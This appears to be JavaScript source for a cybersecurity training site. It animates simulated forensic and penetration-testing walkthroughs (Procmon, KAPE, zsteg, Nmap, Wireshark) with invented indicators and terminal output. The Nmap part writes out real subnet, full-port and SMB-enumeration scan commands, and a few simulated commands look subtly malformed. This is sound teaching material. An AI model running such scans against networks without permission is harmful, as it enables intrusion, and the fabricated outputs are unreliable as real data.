    { t: '02:11:42.842', p: 'powershell.exe', pid: '4812', op: 'WriteFile',   path: 'C:\\Users\\jdoe\\AppData\\Roaming\\mshta.exe', res: 'SUCCESS', flag: false },
    { t: '02:11:42.961', p: 'powershell.exe', pid: '4812', op: 'RegSetValue', path: 'HKCU\\...\\Run\\Updater', res: 'SUCCESS', flag: true },
    { t: '02:11:43.118', p: 'powershell.exe', pid: '4812', op: 'CreateFile',  path: 'C:\\Windows\\Temp\\pol.ps1', res: 'SUCCESS', flag: false },
    { t: '02:11:43.277', p: 'powershell.exe', pid: '4812', op: 'RegSetValue', path: 'HKCU\\...\\Run\\Updater', res: 'SUCCESS', flag: true }
  ];
  const lines = [
    `$ # Process Analysis — Sysinternals Procmon @ ${ts()}`,
    `$ # ${lvlLine(lvl,'open')} — ${lvlLine(lvl,'close')}`,
    `$ # Capture: 47 000 events captured on jdoe-wkstn (02:11:42 &rarr; 02:11:48)`,
    '$ # Step 1: filter to powershell.exe',
    '$ procmon /accepteula /quiet',
    '[ok] filter applied — Process Name is powershell.exe (Include)',
    '$ # Step 2: add second filter — Operation is RegSetValue',
    '[ok] filter applied — Operation is RegSetValue (Include)',
    '[ok] 47 RegSetValue events out of 18 700 powershell events',
    '$ # Step 3: inspect the RegSetValue hits',
    '[!] 02:11:42.314  RegSetValue  HKCU\\...\\Run\\Updater  SUCCESS',
    '[!] 02:11:42.961  RegSetValue  HKCU\\...\\Run\\Updater  SUCCESS',
    '[!] 02:11:43.277  RegSetValue  HKCU\\...\\Run\\Updater  SUCCESS',
    '[ok] persistence mechanism: writes Updater value to Run key 3 times',
    '$ # Step 4: lift RegSetValue filter — look at the full picture',
    '[!] 02:11:42.498  WriteFile    C:\\Users\\Public\\stage.exe       SUCCESS',
    '[!] 02:11:42.617  CreateFile   \\\\.\\pipe\\abc                  SUCCESS  (named pipe C2)',
    '[!] 02:11:42.731  RegQueryValue HKLM\\...\\CurrentVersion\\Run    NOT FOUND',
    '[!] 02:11:42.842  WriteFile    C:\\Users\\jdoe\\AppData\\Roaming\\mshta.exe  SUCCESS',
    '$ # Step 5: correlate Procmon timeline with Sysmon EID 1',
    '[ok] Sysmon EID 1 02:11:42  Image=powershell.exe parent=mshta.exe',
    '[ok] Procmon 02:11:42.314 first write to Run key — matches Sysmon create',
    '$ # Workflow complete — finding logged to /cases/INC-2025-047/procmon'
  ];

  function animate(host, timers) {
    const bar = host.querySelector('#pm-bar');
    if (!bar) return;
    const body = host.querySelector('#pm-body');
    if (body) body.innerHTML = '';
    bar.querySelectorAll('.pending,.running,.hit').forEach(e => {
      e.classList.remove('running','hit'); e.classList.add('pending');
    });

    // filter chips activate
    const chips = host.querySelectorAll('#pm-bar .pm-filt-chip, #pm-bar .pm-filt-add');
    chips.forEach((c, i) => {
      timers.later(() => {
        c.classList.remove('pending');
        c.classList.add('running');
      }, 400 + i * 500);
      timers.later(() => {
        c.classList.remove('running');
        c.classList.add('hit');
      }, 400 + i * 500 + 380);
    });

    // events stream in
    let i = 0;
    timers.every(() => {
      if (!body) return;
      const e = evts[i % evts.length];
      i++;
      const r = document.createElement('div');
      r.className = 'pm-ev-row ' + (e.flag ? 'flag' : e.res === 'NOT FOUND' ? 'warn' : 'ok');
      r.innerHTML = `<span class="pm-c-time">${e.t}</span><span class="pm-c-proc">${e.p}</span><span class="pm-c-pid">${e.pid}</span><span class="pm-c-op">${e.op}</span><span class="pm-c-path">${e.path}</span><span class="pm-c-res">${e.res}</span>`;
      body.appendChild(r);
      while (body.children.length > 7) body.removeChild(body.firstChild);
    }, 850);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 9. KAPE (Beginner) ----------
 * Visual: KAPE SELECTOR — two columns (Targets / Modules) with select
 * chips, an Execute button, a progress bar that fills (1842 artifacts
 * in 47s) and a collected-artifacts tree expanding on the right.
 * Level: beginner → guided walkthrough with module selection help.
 */
function buildKapeSim(skill, meta, lvl) {
  const visual = `
    <div class="kape-grid" id="kape-grid">
      <div class="kape-cols">
        <div class="kape-col">
          <div class="sim-h">// TARGETS</div>
          <div class="kape-target pending" data-i="0" id="kape-t-0"><span class="kt-chk">&#9744;</span><span class="kt-name">!SANS_Triage</span><span class="kt-tip">browser, registry, event logs</span></div>
          <div class="kape-target" data-i="1" id="kape-t-1"><span class="kt-chk">&#9744;</span><span class="kt-name">KapeTriage</span><span class="kt-tip">broader triage, slower</span></div>
          <div class="kape-target" data-i="2" id="kape-t-2"><span class="kt-chk">&#9744;</span><span class="kt-name">RegistryHives</span><span class="kt-tip">just registry hives</span></div>
          <div class="kape-target" data-i="3" id="kape-t-3"><span class="kt-chk">&#9744;</span><span class="kt-name">EventLogs</span><span class="kt-tip">just evtx files</span></div>
        </div>
        <div class="kape-col">
          <div class="sim-h">// MODULES</div>
          <div class="kape-module pending" data-i="0" id="kape-m-0"><span class="km-chk">&#9744;</span><span class="km-name">!EZChain</span><span class="km-tip">chains EVTX→attack analyser→timeline</span></div>
          <div class="kape-module" data-i="1" id="kape-m-1"><span class="km-chk">&#9744;</span><span class="km-name">Hayabusa</span><span class="km-tip">sigma-based evtx scanner</span></div>
          <div class="kape-module" data-i="2" id="kape-m-2"><span class="km-chk">&#9744;</span><span class="km-name">ChainSaw</span><span class="km-tip">Rust-based evtx detection</span></div>
          <div class="kape-module" data-i="3" id="kape-m-3"><span class="km-chk">&#9744;</span><span class="km-name">MFTECmd</span><span class="km-tip">$MFT parser</span></div>
        </div>
      </div>
      <div class="kape-execbar">
        <button class="kape-execute pending" id="kape-exec" disabled>EXECUTE</button>
        <span class="kape-progress-lbl" id="kape-prog-lbl">// awaiting target + module selection</span>
      </div>
      <div class="kape-progress" id="kape-prog">
        <div class="kp-bar"><span class="kp-fill" id="kape-fill"></span></div>
        <div class="kp-stats">
          <span class="kp-stat"><span class="kps-lbl">elapsed</span><span class="kps-val" id="kape-elapsed">0s</span></span>
          <span class="kp-stat"><span class="kps-lbl">artifacts</span><span class="kps-val" id="kape-artifacts">0</span></span>
          <span class="kp-stat"><span class="kps-lbl">target</span><span class="kps-val">!SANS_Triage</span></span>
          <span class="kp-stat"><span class="kps-lbl">module</span><span class="kps-val">!EZChain</span></span>
        </div>
      </div>
      <div class="kape-tree" id="kape-tree">
        <div class="sim-h">// collected artifacts</div>
        <div class="kt-node pending" data-i="0"><span class="kn-tw">&#9654;</span><span class="kn-name">C:\</span></div>
        <div class="kt-node pending open" data-i="1" style="margin-left:14px"><span class="kn-tw">&#9660;</span><span class="kn-name">Windows\System32\winevt\Logs</span></div>
        <div class="kt-leaf pending" data-i="2" style="margin-left:28px"><span class="kn-tw">&#9642;</span><span class="kn-name">Security.evtx</span><span class="kn-size">14 MB</span></div>
        <div class="kt-leaf pending" data-i="3" style="margin-left:28px"><span class="kn-tw">&#9642;</span><span class="kn-name">System.evtx</span><span class="kn-size">8 MB</span></div>
        <div class="kt-leaf pending" data-i="4" style="margin-left:28px"><span class="kn-tw">&#9642;</span><span class="kn-name">Application.evtx</span><span class="kn-size">3 MB</span></div>
        <div class="kt-leaf pending" data-i="5" style="margin-left:28px"><span class="kn-tw">&#9642;</span><span class="kn-name">Sysmon.evtx</span><span class="kn-size">5 MB</span></div>
        <div class="kt-node pending" data-i="6" style="margin-left:14px"><span class="kn-tw">&#9654;</span><span class="kn-name">Users\jdoe\NTUSER.DAT</span></div>
        <div class="kt-node pending" data-i="7"><span class="kn-tw">&#9654;</span><span class="kn-name">$MFT</span></div>
      </div>
    </div>
  `;
  const lines = [
    `$ # KAPE — Kroll Artifact Parser & Extractor @ ${ts()} — beginner walkthrough`,
    `$ # ${lvlLine(lvl,'open')} — ${lvlLine(lvl,'close')}`,
    `$ man kape`,
    '[doc] KAPE — targeted forensic artifact collection + processing pipeline',
    '$ # Step 1: select a TARGET (what to collect from the live system)',
    '$ kape.exe --tlist | findstr Triage',
    '[ok] !SANS_Triage         — browser, registry, event logs (fast)',
    '[ok] KapeTriage            — broader, slower',
    '$ # Select !SANS_Triage as the target',
    '$ kape.exe --target=!SANS_Triage --mvars',
    '$ # Step 2: select a MODULE (how to process the collected artifacts)',
    '$ kape.exe --mlist | findstr Chain',
    '[ok] !EZChain             — EVTX → attack analyser → timeline',
    '[ok] Hayabusa             — sigma-based evtx scanner',
    '$ # Select !EZChain as the module',
    '$ kape.exe --module=!EZChain',
    '$ # Step 3: execute the collection + processing pipeline',
    '$ kape.exe --target=!SANS_Triage --module=!EZChain --flush',
    '[*] collecting artifacts to _KAPE\\\u2026',
    '[ok] 1842 artifacts collected in 47s',
    '$ # Step 4: review the processed timeline',
    '$ cat _EZChain/_timeline.csv | head -5',
    '[ok] 02:11:42,EVENTID=1,Image=powershell.exe,parent=mshta.exe',
    '[ok] 02:11:42,EVENTID=13,RegSetValue=HKCU\\...\\Run\\Updater',
    '[ok] 02:11:43,EVENTID=3,Dst=185.43.21.9:443',
    '$ # Workflow complete — 1842 artifacts in 47s, ready for triage'
  ];

  function animate(host, timers) {
    const grid = host.querySelector('#kape-grid');
    if (!grid) return;
    grid.querySelectorAll('.pending,.running,.hit,.done').forEach(e => {
      e.classList.remove('running','hit','done'); e.classList.add('pending');
    });
    const exec = host.querySelector('#kape-exec');
    const lbl  = host.querySelector('#kape-prog-lbl');
    const fill = host.querySelector('#kape-fill');
    const elapsed = host.querySelector('#kape-elapsed');
    const artifacts = host.querySelector('#kape-artifacts');
    if (exec) { exec.classList.remove('hit','done'); exec.classList.add('pending'); exec.disabled = true; exec.textContent = 'EXECUTE'; }
    if (lbl)  lbl.textContent = '// awaiting target + module selection';
    if (fill) fill.style.width = '0%';
    if (elapsed) elapsed.textContent = '0s';
    if (artifacts) artifacts.textContent = '0';

    // Select !SANS_Triage target
    timers.later(() => {
      const t = host.querySelector('#kape-t-0');
      if (t) {
        t.classList.remove('pending');
        t.classList.add('hit');
        t.querySelector('.kt-chk').innerHTML = '&#9745;';
      }
      if (lbl) lbl.textContent = '// target !SANS_Triage selected';
    }, 800);

    // Select !EZChain module
    timers.later(() => {
      const m = host.querySelector('#kape-m-0');
      if (m) {
        m.classList.remove('pending');
        m.classList.add('hit');
        m.querySelector('.km-chk').innerHTML = '&#9745;';
      }
      if (lbl) lbl.textContent = '// target + module selected — ready';
    }, 1800);

    // Execute button activates
    timers.later(() => {
      if (exec) { exec.classList.remove('pending'); exec.classList.add('hit'); exec.disabled = false; exec.textContent = '▶ EXECUTE'; }
      if (lbl) lbl.textContent = '// execute!';
    }, 2800);

    // Click execute → progress bar fills 0→100% over ~4s, 0→1842 artifacts
    timers.later(() => {
      if (exec) { exec.classList.add('running'); exec.textContent = 'RUNNING…'; exec.disabled = true; }
      if (lbl) lbl.textContent = '// collection in progress — !SANS_Triage + !EZChain';
    }, 3600);
    for (let k = 1; k <= 47; k++) {
      timers.later(() => {
        const pct = Math.round(k * 100 / 47);
        if (fill) fill.style.width = pct + '%';
        if (elapsed) elapsed.textContent = k + 's';
        if (artifacts) artifacts.textContent = Math.round(1842 * k / 47);
      }, 3600 + k * 95);
    }
    timers.later(() => {
      if (exec) { exec.classList.remove('running'); exec.classList.add('done'); exec.textContent = 'DONE'; }
      if (lbl) lbl.textContent = '// 1842 artifacts collected in 47s — expanding tree…';
    }, 3600 + 47 * 95 + 200);

    // Tree expands sequentially
    const treeNodes = host.querySelectorAll('#kape-tree .kt-node, #kape-tree .kt-leaf');
    treeNodes.forEach((n, i) => {
      timers.later(() => {
        n.classList.remove('pending');
        n.classList.add('hit');
      }, 3600 + 47 * 95 + 600 + i * 320);
    });
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 10. Steganography Detection (Beginner) ----------
 * Visual: STEG VIEWER — PNG image on the left (mock pixel grid),
 * zsteg/stegsolve tabs on the right revealing R-LSB extraction
 * output "payload goes brrr" line by line.
 * Level: beginner → guided with tab tooltips.
 */
function buildSteganographyDetectionSim(skill, meta, lvl) {
  const visual = `
    <div class="steg-grid" id="steg-grid">
      <div class="steg-img">
        <div class="sim-h">// cover image — puzzle.png (320 × 240, RGBA)</div>
        <div class="si-frame" id="si-frame">
          <svg viewBox="0 0 320 240" class="si-svg" preserveAspectRatio="none">
            <defs>
              <linearGradient id="steg-grad" x1="0" y1="0" x2="1" y2="1">
                <stop offset="0%" stop-color="#0a3a2a"/>
                <stop offset="100%" stop-color="#0a0a14"/>
              </linearGradient>
            </defs>
            <rect width="320" height="240" fill="url(#steg-grad)"/>
            <g id="si-pixels"></g>
            <text x="160" y="130" text-anchor="middle" fill="rgba(255,255,255,0.35)" font-family="monospace" font-size="11">cover image</text>
          </svg>
        </div>
        <div class="si-meta">
          <span class="si-k">SHA256</span><span class="si-v">4f8c7a13...e201</span>
          <span class="si-k">SIZE</span><span class="si-v">14 KB</span>
          <span class="si-k">ENTROPY</span><span class="si-v" id="steg-ent">7.91</span>
        </div>
      </div>
      <div class="steg-tabs">
        <div class="sim-h">// steg analysis — click a tab</div>
        <div class="st-tabs">
          <span class="st-tab pending" data-i="0" id="steg-tab-zsteg">zsteg</span>
          <span class="st-tab pending" data-i="1" id="steg-tab-stegsolve">stegsolve</span>
          <span class="st-tab pending" data-i="2" id="steg-tab-steghide">steghide</span>
        </div>
        <div class="st-body" id="steg-body">
          <div class="st-out" id="steg-out"></div>
        </div>
        <div class="steg-verdict pending" id="steg-verdict">
          <span class="sv-tag">// VERDICT</span>
          <span class="sv-text">awaiting tab review…</span>
        </div>
      </div>
    </div>
  `;
  const lines = [
    `$ # Steganography Detection @ ${ts()} — beginner walkthrough`,
    `$ # ${lvlLine(lvl,'open')} — ${lvlLine(lvl,'close')}`,
    `$ # Cover image: puzzle.png (14 KB, sha256=4f8c7a13...e201)`,
    '$ man zsteg',
    '[doc] zsteg — detect stego in PNG & BMP (LSB, channels, planes)',
    '$ file puzzle.png',
    '[ok] puzzle.png: PNG image, 320 × 240, 8-bit RGBA',
    '$ # Step 1: run zsteg with all defaults',
    '$ zsteg puzzle.png',
    '[+] b1,r,lsb,xy  : text:"payload goes brrr\\n"',
    '[+] b1,g,lsb,xy  : text:"\\x00\\x00\\x00\\x00"',
    '[+] b1,b,lsb,xy  : text:"\\x00\\x00\\x00\\x00"',
    '[!] R channel LSB carries a human-readable payload',
    '$ # Step 2: confirm with stegsolve (channel R, plane 0, LSB)',
    '$ stegsolve puzzle.png --channel=R --plane=0',
    '[ok] plane R-0 reveals ASCII payload',
    '[ok] extracted: "payload goes brrr"',
    '$ # Step 3: check steghide (different format)',
    '$ steghide info puzzle.png',
    '[ok] steghide: not applicable (only for JPEG/BMP/WAV/AU)',
    '$ # Step 4: extract payload and submit',
    '$ zsteg -e "b1,r,lsb,xy" puzzle.png > extracted.txt',
    '[ok] extracted.txt = "payload goes brrr\\n" (20 bytes)',
    '[ok] verdict: HIDDEN PAYLOAD CONFIRMED — R-LSB channel encoding',
    '$ # ready to progress to intermediate — multi-image triage workflow'
  ];

  // Build a static pixel grid in the SVG (8×6 cells) — visually represents the cover image
  function buildPixelGrid() {
    const cells = [];
    for (let y = 0; y < 6; y++) {
      for (let x = 0; x < 8; x++) {
        const r = 40 + (x * 24) % 160;
        const g = 80 + (y * 17) % 90;
        const b = 30 + ((x + y) * 11) % 60;
        cells.push(`<rect x="${x*40}" y="${y*40}" width="40" height="40" fill="rgb(${r},${g},${b})"/>`);
      }
    }
    return cells.join('');
  }

  function animate(host, timers) {
    const grid = host.querySelector('#steg-grid');
    if (!grid) return;
    const pixels = host.querySelector('#si-pixels');
    if (pixels) pixels.innerHTML = buildPixelGrid();
    grid.querySelectorAll('.pending,.running,.hit,.malicious-now').forEach(e => {
      e.classList.remove('running','hit','malicious-now');
      e.classList.add('pending');
    });
    const out = host.querySelector('#steg-out');
    if (out) out.innerHTML = '';
    const verdict = host.querySelector('#steg-verdict .sv-text');
    const verdictBox = host.querySelector('#steg-verdict');
    if (verdict) verdict.textContent = 'awaiting tab review…';
    if (verdictBox) { verdictBox.classList.remove('hit','malicious-now'); verdictBox.classList.add('pending'); }

    // Highlight R-LSB pixels (subtle red overlay on column 0 of pixel grid)
    timers.later(() => {
      if (pixels) {
        // overlay small "LSB" markers on leftmost column
        const overlay = '<rect x="0" y="0" width="40" height="240" fill="rgba(255,64,64,0.22)"/>' +
                        '<text x="20" y="20" text-anchor="middle" fill="rgba(255,128,128,0.9)" font-size="9" font-family="monospace">R</text>';
        pixels.insertAdjacentHTML('beforeend', overlay);
      }
    }, 600);

    // tabs activate sequentially
    const tabs = [
      { sel: '#steg-tab-zsteg',     msg: ['[*] scanning puzzle.png with zsteg…',
                                         '[+] b1,r,lsb,xy  : text:"payload goes brrr"',
                                         '[+] b1,g,lsb,xy  : text:"\\x00\\x00\\x00"',
                                         '[!] R channel LSB — human-readable payload'] },
      { sel: '#steg-tab-stegsolve', msg: ['[*] isolating channel R, plane 0 (LSB)',
                                         '[ok] plane R-0 reveals ASCII payload',
                                         '[ok] extracted: "payload goes brrr"',
                                         '[ok] matches zsteg output'] },
      { sel: '#steg-tab-steghide', msg: ['[*] steghide applicable to JPEG/BMP only',
                                         '[ok] puzzle.png → not a steghide carrier',
                                         '[!] no hidden payload via steghide'] }
    ];
    tabs.forEach((t, i) => {
      timers.later(() => {
        const tabEl = host.querySelector(t.sel);
        if (tabEl) { tabEl.classList.remove('pending'); tabEl.classList.add('running'); }
      }, 1800 + i * 2600);
      timers.later(() => {
        const tabEl = host.querySelector(t.sel);
        if (tabEl) { tabEl.classList.remove('running'); tabEl.classList.add('hit'); }
        if (out) {
          // append lines for this tab
          t.msg.forEach((m, j) => {
            timers.later(() => {
              const ln = document.createElement('div');
              ln.className = 'st-line ' + (/\[!\]/.test(m) ? 'crit' : /\[\+\]/.test(m) ? 'warn' : 'ok');
              ln.textContent = m;
              out.appendChild(ln);
              while (out.children.length > 5) out.removeChild(out.firstChild);
            }, j * 380);
          });
        }
      }, 1800 + i * 2600 + 600);
    });

    // verdict
    timers.later(() => {
      if (verdict) verdict.textContent = 'CONFIRMED — R-LSB channel encodes "payload goes brrr"';
      if (verdictBox) { verdictBox.classList.remove('pending'); verdictBox.classList.add('hit','malicious-now'); }
    }, 11400);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ============================================================
 *  BATCH B — builder registry
 *  Keys MUST match SKILL_META entry names verbatim.
 * ============================================================ */
const BATCH_B_BUILDERS = {
  'Hypothesis-driven Hunting':           buildHypothesisDrivenHuntingSim,
  'Network Forensics / Packet Analysis':  buildNetworkForensicsPacketAnalysisSim,
  'Memory Forensics (Volatility 3)':      buildMemoryForensicsVolatility3Sim,
  'Disk Forensics (Autopsy)':             buildDiskForensicsAutopsySim,
  'Disk Forensics (FTK Imager)':          buildDiskForensicsFtkImagerSim,
  'Malware Analysis (YARA)':              buildMalwareAnalysisYaraSim,
  'Malware Analysis (PEStudio)':         buildMalwareAnalysisPEStudioSim,
  'Process Analysis (Procmon)':           buildProcessAnalysisProcmonSim,
  'KAPE':                                 buildKapeSim,
  'Steganography Detection':              buildSteganographyDetectionSim
};

/* ============================================================
 *  BATCH C — Penetration Testing & VA (9 skills)
 *  Each builder produces a UNIQUE visual + animation + terminal
 *
 *  Builders:
 *    1. buildNmapSim          — Nmap            (Advanced)     — nmap console + target list
 *    2. buildWiresharkSim      — Wireshark       (Advanced)     — packet capture table + filter bar
 *    3. buildTcpdumpSim       — tcpdump         (Advanced)     — dual terminal capture + analysis
 *    4. buildOsintFrameworkSim— OSINT Framework (Intermediate) — 3-pane recon dashboard
 *    5. buildOwaspTop10Sim    — OWASP Top 10    (Intermediate) — 5x2 findings matrix
 *    6. buildCvssV31Sim       — CVSS v3.1       (Advanced)     — calculator + score gauge
 *    7. buildNistSp800115Sim  — NIST SP 800-115 (Intermediate) — 6-phase methodology tracker
 *    8. buildBurpSuiteSim     — Burp Suite      (Intermediate) — Repeater request/response panes
 *    9. buildMetasploitSim    — Metasploit      (Beginner)     — msfconsole + stage pipeline
 * ============================================================ */

/* ---------- NMAP — Advanced (multi-system investigation) ---------- */
function buildNmapSim(skill, meta, lvl) {
  const visual = `
    <div class="nmap-grid">
      <div class="nmap-console">
        <div class="nmap-pane-head">// nmap console — multi-host enumeration (T4 aggressive, full TCP range)</div>
        <div class="nmap-out" id="nmap-out"></div>
      </div>
      <div class="nmap-targets">
        <div class="nmap-pane-head">// target list — 192.168.1.0/24 (live hosts)</div>
        <div class="nmap-target" id="nmap-t1"><span class="nmap-target-ip">192.168.1.1</span><span class="nmap-target-role">gateway</span><span class="nmap-target-status">queued</span></div>
        <div class="nmap-target" id="nmap-t2"><span class="nmap-target-ip">192.168.1.42</span><span class="nmap-target-role">workstation</span><span class="nmap-target-status">queued</span></div>
        <div class="nmap-target" id="nmap-t3"><span class="nmap-target-ip">192.168.1.73</span><span class="nmap-target-role">voip adapter</span><span class="nmap-target-status">queued</span></div>
      </div>
    </div>
    <div class="kpi-strip">
      <div class="kpi-cell"><div class="kpi-val" id="nmap-up">0</div><div class="kpi-lbl">hosts up</div></div>
      <div class="kpi-cell"><div class="kpi-val" id="nmap-open">0</div><div class="kpi-lbl">open ports</div></div>
      <div class="kpi-cell"><div class="kpi-val" id="nmap-filt">0</div><div class="kpi-lbl">filtered</div></div>
      <div class="kpi-cell"><div class="kpi-val" id="nmap-svc">0</div><div class="kpi-lbl">svc fp</div></div>
    </div>
  `;
  const lines = [
    '$ # nmap — advanced multi-system investigation',
    '$ # multi-step investigation — produces a remediation proposal',
    '$ # Phase 1 — host discovery across 192.168.1.0/24',
    "$ nmap -sn 192.168.1.0/24 -oG - | awk '/Up/{print $2}'",
    '[ok] 192.168.1.1   Up',
    '[ok] 192.168.1.42  Up',
    '[ok] 192.168.1.73  Up',
    '$ # Phase 2 — top-1000 + service detection on live hosts',
    '$ nmap -sV -T4 --top-ports 1000 192.168.1.1 192.168.1.42 192.168.1.73',
    '[ok] 192.168.1.1  -> 4 open ports, 4 services fingerprinted',
    '[ok] 192.168.1.42 -> 2 open ports, 2 services fingerprinted',
    '[ok] 192.168.1.73 -> 2 open ports, 2 services fingerprinted',
    '$ # Phase 3 — full TCP range + default scripts + OS detection',
    '$ sudo nmap -sV -sC -O -p- -T4 --min-rate 2000 192.168.1.1 -oA gateway_full',
    '[ok] 7547/tcp open http   Broadband Forum TR-069 CWMP',
    '[err] 23/tcp   open telnet  Linux telnetd  ← plaintext admin creds — CRITICAL',
    '$ # Phase 4 — pivot: enumerate SMB + RDP on the workstation',
    '$ nmap -sV -p 445,3389 --script smb-os-discovery,smb-enum-shares 192.168.1.42',
    '[ok] 445/tcp  open microsoft-ds  Windows 10 Pro 19044',
    '[warn] share \\\\192.168.1.42\\C$ accessible with guest credentials',
    '$ # Phase 5 — write findings → remediation proposal',
    '$ nmap -oA findings_$(date +%Y%m%d) && pandoc findings.md -o report.pdf',
    '[ok] workflow complete — 1 critical (telnet), 1 high (TR-069 CWMP), 2 medium'
  ];

  function animate(host, timers) {
    const out = host.querySelector('#nmap-out');
    if (!out) return;
    out.innerHTML = '';
    const t1 = host.querySelector('#nmap-t1');
    const t2 = host.querySelector('#nmap-t2');
    const t3 = host.querySelector('#nmap-t3');
    const upEl = host.querySelector('#nmap-up');
    const opEl = host.querySelector('#nmap-open');
    const fEl = host.querySelector('#nmap-filt');
    const sEl = host.querySelector('#nmap-svc');
    [t1, t2, t3].forEach((t) => { if (t) t.className = 'nmap-target'; });
    [upEl, opEl, fEl, sEl].forEach((e) => { if (e) e.textContent = '0'; });

    const hosts = [
      {
        node: t1,
        lines: [
          'Nmap scan report for 192.168.1.1',
          'Host is up (0.0042s latency, 1 hop).',
          'PORT     STATE SERVICE     VERSION',
          '23/tcp   open  telnet      Linux telnetd',
          '80/tcp   open  http        lighttpd 1.4.59',
          '7547/tcp open  http        CWMP — TR-069 (BBF)',
          '8080/tcp open  http-proxy mini_httpd',
          'MAC: 00:1F:E3:AB:CD:EF (Sagemcom)',
          'OS: Linux 4.15 - 5.6 (96% confidence)'
        ],
        open: 4, filt: 0, svc: 4, crit: true
      },
      {
        node: t2,
        lines: [
          'Nmap scan report for 192.168.1.42',
          'Host is up (0.012s latency).',
          'PORT     STATE SERVICE       VERSION',
          '445/tcp  open microsoft-ds  Windows 10 Pro 19044',
          '3389/tcp open ms-wbt-server Microsoft Terminal Service',
          'SMB: WORKGROUP\\\\WIN10-DEV (signed: optional)',
          'share \\\\192.168.1.42\\C$ — guest-read flagged'
        ],
        open: 2, filt: 0, svc: 2, crit: false
      },
      {
        node: t3,
        lines: [
          'Nmap scan report for 192.168.1.73',
          'Host is up (0.0083s latency).',
          'PORT      STATE SERVICE      VERSION',
          '5060/tcp  open  sip          Kamailio 5.7',
          '10000/udp open sip-media     RTP/AVP (unencrypted)',
          'Auth: Digest (RFC 2617) — nonce reuse flagged'
        ],
        open: 2, filt: 0, svc: 2, crit: false
      }
    ];

    let h = 0, cumUp = 0, cumOp = 0, cumFl = 0, cumSc = 0;

    function streamHost(idx) {
      const hh = hosts[idx];
      if (!hh || !hh.node) {
        if (idx >= hosts.length) {
          timers.later(() => animate(host, timers), 2500);
        }
        return;
      }
      hh.node.classList.add('scanning');
      hh.node.querySelector('.nmap-target-status').textContent = 'scanning';
      hh.lines.forEach((ln, i) => {
        timers.later(() => {
          const row = document.createElement('div');
          row.className = 'nmap-out-line';
          if (/\b(telnet|plaintext|CRITICAL)\b/.test(ln)) row.classList.add('nmap-out-crit');
          else if (/^Nmap scan report/.test(ln)) row.classList.add('nmap-out-host');
          else if (/^PORT\b/.test(ln)) row.classList.add('nmap-out-header');
          else if (/^MAC|^OS|^SMB|^share|^Auth/.test(ln)) row.classList.add('nmap-out-meta');
          row.textContent = ln;
          out.appendChild(row);
          out.scrollTop = out.scrollHeight;
          while (out.children.length > 12) out.removeChild(out.firstChild);
        }, i * 320);
      });
      const total = hh.lines.length * 320 + 400;
      timers.later(() => {
        hh.node.classList.remove('scanning');
        hh.node.classList.add(hh.crit ? 'hit' : 'done');
        hh.node.querySelector('.nmap-target-status').textContent = hh.crit ? 'CRITICAL' : 'done';
        cumUp += 1; cumOp += hh.open; cumFl += hh.filt; cumSc += hh.svc;
        if (upEl) upEl.textContent = cumUp;
        if (opEl) opEl.textContent = cumOp;
        if (fEl) fEl.textContent = cumFl;
        if (sEl) sEl.textContent = cumSc;
        const next = idx + 1;
        if (next < hosts.length) streamHost(next);
        else timers.later(() => animate(host, timers), 2500);
      }, total);
    }
    streamHost(0);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- WIRESHARK — Advanced (multi-system investigation) ---------- */
function buildWiresharkSim(skill, meta, lvl) {
  const visual = `
    <div class="shark-bar">
      <span class="shark-bar-lbl">// filter:</span>
      <span class="shark-bar-input" id="shark-filter">sip</span>
      <span class="shark-bar-apply" id="shark-apply">APPLY</span>
      <span class="shark-bar-count" id="shark-count">0 frames shown</span>
    </div>
    <div class="shark-table" id="shark-table">
      <div class="shark-row shark-head">
        <span class="shark-c shark-c-no">No.</span>
        <span class="shark-c shark-c-time">Time</span>
        <span class="shark-c shark-c-src">Source</span>
        <span class="shark-c shark-c-dst">Destination</span>
        <span class="shark-c shark-c-proto">Protocol</span>
        <span class="shark-c shark-c-len">Len</span>
        <span class="shark-c shark-c-info">Info</span>
      </div>
    </div>
  `;
  const lines = [
    '$ # wireshark / tshark — advanced packet investigation',
    '$ # multi-step investigation — produces a remediation proposal',
    '$ # Phase 1 — capture live SIP traffic on port 5060',
    "$ dumpcap -i eth0 -f 'port 5060' -w voip_register_flood.pcap",
    '[ok] captured 14283 frames in 60s (8.4 MB on disk)',
    '$ # Phase 2 — dissect SIP methods with tshark',
    "$ tshark -r voip_register_flood.pcap -Y 'sip' -T fields \\",
    '    -e frame.number -e ip.src -e ip.dst -e sip.Method -e sip.CSeq',
    '[ok] 1  10.0.0.5  10.0.0.1  REGISTER  1 REGISTER',
    '[ok] 2  10.0.0.1  10.0.0.5  401        1 Unauthorized',
    '[warn] 3  10.0.0.5  10.0.0.1  REGISTER  2 REGISTER+auth',
    '[ok] 4  10.0.0.1  10.0.0.5  200 OK     2 OK',
    '[err] flood pattern: 14279 REGISTER frames from 10.0.0.5 in 60s',
    '$ # Phase 3 — extract auth attempts → brute-force detection',
    "$ tshark -r voip_register_flood.pcap -Y 'sip.Method == \"REGISTER\"' \\",
    '    -T fields -e sip.From -e sip.Authorization | sort -u',
    '[warn] 47 distinct nonce reuse attempts — RFC 2617 violation',
    '$ # Phase 4 — pivot: correlate with media-plane RTP leaks',
    "$ tshark -r voip_register_flood.pcap -Y 'rtp' -T fields -e rtp.p_type",
    '[err] RTP on unencrypted UDP 10000 — SRTP bypass confirmed',
    '$ # Phase 5 — seal pcap evidence for IR',
    '$ editcap --inject-secrets voip_register_flood.pcap,rsa voip_evidence.pcap',
    '[ok] evidence sealed — SHA-256 3a7f...e91d → SOC IR'
  ];

  const frames = [
    { n: 1, t: '0.000001', s: '10.0.0.5',  d: '10.0.0.1', p: 'SIP',  l: 412, i: 'REGISTER sip:voip.example.com', cls: 'shark-reg' },
    { n: 2, t: '0.001142', s: '10.0.0.1',  d: '10.0.0.5', p: 'SIP',  l: 388, i: 'SIP/2.0 401 Unauthorized', cls: 'shark-401' },
    { n: 3, t: '0.002871', s: '10.0.0.5',  d: '10.0.0.1', p: 'SIP',  l: 596, i: 'REGISTER+auth CSeq=2', cls: 'shark-reg' },
    { n: 4, t: '0.004098', s: '10.0.0.1',  d: '10.0.0.5', p: 'SIP',  l: 372, i: 'SIP/2.0 200 OK', cls: 'shark-ok' },
